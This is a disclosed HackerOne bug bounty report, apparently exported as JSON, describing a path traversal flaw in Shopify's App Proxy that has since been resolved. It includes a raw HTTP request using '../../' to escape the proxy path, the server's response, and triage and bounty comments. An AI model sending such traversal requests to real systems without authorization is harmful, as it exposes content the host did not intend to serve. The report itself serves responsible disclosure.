{"id":869888,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84Njk4ODg=","url":"https://hackerone.com/reports/869888","title":"Path Traversal in App Proxy","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-05-10T06:56:14.534Z","submitted_at":"2020-05-10T06:56:14.534Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ngalog","url":"/ngalog","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/074/607/68068f139c99d98e3e8baf0a51f219c29ade1769_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-08-24T22:27:51.998Z","bug_reporter_agreed_on_going_public_at":"2020-08-24T22:27:51.852Z","team_member_agreed_on_going_public_at":"2020-08-18T19:57:12.745Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi,\n\nI found app proxy is vulnerable to path traversal, the attacker scenario is from anonymous user to oauth app owner.\n\n## Description\nIn app proxy function, it is possible proxy request to shopify custom domain request to oauth app store defined host, and because shopify didn't escape the `../`, it allows anyone to escape the path and reach unintended location.\n\n## Steps to reproduce\n- Since setting up and explaining how to setup app proxy would be so trouble, I'll go straight to the point.\n- The app proxy for my oauth app is set to  `https://████████/proxy`, path and subpath is `apps/ss`\n- My store `█████` has installed it\n- If you go https://███████/apps/ss/test, you should see `hi im ron`, which matches `https://██████████/proxy/test`\n- In theory, you can't use this proxy to see what's hosting in `https://████████/` since I have added `/proxy` in the path\n- However with this path traversal, it is possible now\n\nCopy and paste this to the burp repeater and hit Send\n\n```\nGET /apps/ss/b.php/../../?shop=a\u0026Shop=asd HTTP/1.1\nHost: ███████\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nUpgrade-Insecure-Requests: 1\n\n\n```\n\nresponse is \n\n```\n\t\u003chead\u003e\n\u003cmeta name=dropbox-domain-verification content=4yyz8tdqnx1e /\u003e\n\u003c/head\u003e\n\n\n\u003cbody\u003ehi\u003c/body\u003e\n\n\n```\n\nWhich matches response at `https://█████/`\n\n## Impact\n\nAble to perform path traversal on oauth app as anonymous user","vulnerability_information_html":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eI found app proxy is vulnerable to path traversal, the attacker scenario is from anonymous user to oauth app owner.\u003c/p\u003e\n\n\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003eIn app proxy function, it is possible proxy request to shopify custom domain request to oauth app store defined host, and because shopify didn\u0026#39;t escape the \u003ccode\u003e../\u003c/code\u003e, it allows anyone to escape the path and reach unintended location.\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps to reproduce\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eSince setting up and explaining how to setup app proxy would be so trouble, I\u0026#39;ll go straight to the point.\u003c/li\u003e\n\u003cli\u003eThe app proxy for my oauth app is set to  \u003ccode\u003ehttps://████████/proxy\u003c/code\u003e, path and subpath is \u003ccode\u003eapps/ss\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eMy store \u003ccode\u003e█████\u003c/code\u003e has installed it\u003c/li\u003e\n\u003cli\u003eIf you go https://███████/apps/ss/test, you should see \u003ccode\u003ehi im ron\u003c/code\u003e, which matches \u003ccode\u003ehttps://██████████/proxy/test\u003c/code\u003e\n\u003c/li\u003e\n\u003cli\u003eIn theory, you can\u0026#39;t use this proxy to see what\u0026#39;s hosting in \u003ccode\u003ehttps://████████/\u003c/code\u003e since I have added \u003ccode\u003e/proxy\u003c/code\u003e in the path\u003c/li\u003e\n\u003cli\u003eHowever with this path traversal, it is possible now\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eCopy and paste this to the burp repeater and hit Send\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eGET /apps/ss/b.php/../../?shop=a\u0026amp;Shop=asd HTTP/1.1\nHost: ███████\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nUpgrade-Insecure-Requests: 1\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eresponse is \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e    \u0026lt;head\u0026gt;\n\u0026lt;meta name=dropbox-domain-verification content=4yyz8tdqnx1e /\u0026gt;\n\u0026lt;/head\u0026gt;\n\n\n\u0026lt;body\u0026gt;hi\u0026lt;/body\u0026gt;\n\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhich matches response at \u003ccode\u003ehttps://█████/\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eAble to perform path traversal on oauth app as anonymous user\u003c/p\u003e\n","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":19,"name":"Path Traversal"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":18,"voters":["thaivu","mashoud1122","mik317","prophet","youngsheldon","mygf","cyanpiny","mainteemoforfun","japz","klau5","and 8 more..."],"severity":{"rating":"medium","score":6.8,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"high","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"low","integrity":"low","availability":"low"}},"structured_scope":{"databaseId":422,"asset_type":"URL","asset_identifier":"partners.shopify.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":8015664,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hey @ngalog, thanks for the report and for your patience!\n\nWe were able to reproduce the issue and our engineering team is working on a fix.\n\nCheers.","markdown_message":"\u003cp\u003eHey \u003ca href=\"/ngalog\"\u003e@ngalog\u003c/a\u003e, thanks for the report and for your patience!\u003c/p\u003e\n\n\u003cp\u003eWe were able to reproduce the issue and our engineering team is working on a fix.\u003c/p\u003e\n\n\u003cp\u003eCheers.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-15T20:02:44.175Z","updated_at":"2020-05-15T20:02:44.175Z","actor":{"username":"alex_richter","cleared":false,"url":"/alex_richter","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8060023,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks again for your report. We're awarding a $500 bounty for this issue under the server-side request forgery category for Shopify Core. We placed this at the lower end of the range for this vulnerability type because successful exploitation would only be possible in cases where the server hosting an app proxy is not directly accessible, and has sensitive content outside its app proxy path.\n\nWe'll be in touch again once the issue is resolved.","markdown_message":"\u003cp\u003eThanks again for your report. We\u0026#39;re awarding a $500 bounty for this issue under the server-side request forgery category for Shopify Core. We placed this at the lower end of the range for this vulnerability type because successful exploitation would only be possible in cases where the server hosting an app proxy is not directly accessible, and has sensitive content outside its app proxy path.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;ll be in touch again once the issue is resolved.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-05-20T15:52:01.855Z","updated_at":"2020-05-20T15:52:01.855Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Shopify"}},"bounty_amount":"500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"ngalog","url":"/ngalog"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8233862,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey @ngalog.\n\nOur engineering team has deployed a fix for this so the issue should no longer be reproducible. If you are able to bypass the fix, please let us know.\n\nThanks for helping make Shopify more secure. We hope you'll continue to do so.\n\nHappy Hacking!","markdown_message":"\u003cp\u003eHey \u003ca href=\"/ngalog\"\u003e@ngalog\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003eOur engineering team has deployed a fix for this so the issue should no longer be reproducible. If you are able to bypass the fix, please let us know.\u003c/p\u003e\n\n\u003cp\u003eThanks for helping make Shopify more secure. We hope you\u0026#39;ll continue to do so.\u003c/p\u003e\n\n\u003cp\u003eHappy Hacking!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-06-08T15:24:40.415Z","updated_at":"2020-06-08T15:24:40.415Z","actor":{"username":"alex_richter","cleared":false,"url":"/alex_richter","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"ngalog","url":"/ngalog"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8516171,"is_internal":false,"editable":false,"type":"Activities::ReportVulnerabilityTypesUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2020-07-06T15:50:07.497Z","updated_at":"2020-07-06T15:50:07.497Z","additional_data":{"added_weaknesses":[{"id":19,"name":"Path Traversal"}],"removed_weaknesses":[]},"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8972391,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-18T19:57:12.774Z","updated_at":"2020-08-18T19:57:12.774Z","first_to_agree":true,"actor":{"username":"shopify-peteryaworski","cleared":false,"url":"/shopify-peteryaworski","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/175/526/7ba4844078e290c91c4c46a345b4f9e7666f3ed4_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8972978,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@shopify-peteryaworski \n\nCan you please redact ██████████ and █████████.\n\nThank you very much!\n\nRon","markdown_message":"\u003cp\u003e\u003ca href=\"/shopify-peteryaworski\"\u003e@shopify-peteryaworski\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eCan you please redact ██████████ and █████████.\u003c/p\u003e\n\n\u003cp\u003eThank you very much!\u003c/p\u003e\n\n\u003cp\u003eRon\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-18T21:49:24.619Z","updated_at":"2020-08-24T16:10:42.939Z","actor":{"username":"ngalog","cleared":true,"url":"/ngalog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/607/68068f139c99d98e3e8baf0a51f219c29ade1769_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9025595,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @ngalog,\n\nI've redacted the strings you mentioned. Feel free to agree to disclosure whenever you'd like.","markdown_message":"\u003cp\u003eHi \u003ca href=\"/ngalog\"\u003e@ngalog\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ve redacted the strings you mentioned. Feel free to agree to disclosure whenever you\u0026#39;d like.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-24T16:11:12.201Z","updated_at":"2020-08-24T16:11:12.201Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9028702,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Cheers~","markdown_message":"\u003cp\u003eCheers~\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-24T22:27:51.877Z","updated_at":"2020-08-24T22:27:51.877Z","actor":{"username":"ngalog","cleared":true,"url":"/ngalog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/607/68068f139c99d98e3e8baf0a51f219c29ade1769_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9028703,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-24T22:27:52.039Z","updated_at":"2020-08-24T22:27:52.039Z","actor":{"username":"ngalog","cleared":true,"url":"/ngalog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/607/68068f139c99d98e3e8baf0a51f219c29ade1769_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}